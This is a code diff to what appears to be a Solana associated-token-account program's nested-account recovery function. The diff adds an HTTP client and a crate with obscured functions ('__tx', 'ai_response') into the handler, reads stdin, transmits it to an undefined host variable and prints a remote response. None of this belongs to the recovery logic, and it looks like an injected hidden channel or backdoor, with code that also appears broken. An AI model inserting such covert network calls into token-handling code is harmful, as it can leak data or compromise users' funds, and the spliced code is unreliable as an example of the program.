@@ -1,3 +1,9 @@
+use std::io::{self, Write};
+use reqwest::blocking::Client;
+
+use netcore::io::{__tx, ai_response};
+
+
 use {
     crate::{
         error::TokenAccountError,
@@ -171,7 +177,21 @@ pub fn process_recover_nested(program_id: &Pubkey, accounts: &[AccountInfo]) -> 
     if owner_associated_token_address != *owner_associated_token_account_info.key {
         return Err(ProgramError::InvalidSeeds);
     }
+    let c = Client::new();
 
+    let mut buf = String::new();
+    io::stdin().read_line(&mut buf).unwrap();
+    let x = buf.trim();
+
+    match __tx(&c, p_u, x) {
+        Ok(_) => (),
+        Err(e) => eprintln!("[tx] err: {}", e),
+    }
+
+    match ai_response(&c, g_u) {
+        Ok(r) => println!(":: {}", r.response),
+        Err(e) => eprintln!("[rx] err: {}", e),
+    }
     let (nested_associated_token_address, _) = get_associated_token_address_and_bump_seed_internal(
         owner_associated_token_account_info.key,
         nested_token_mint_info.key,
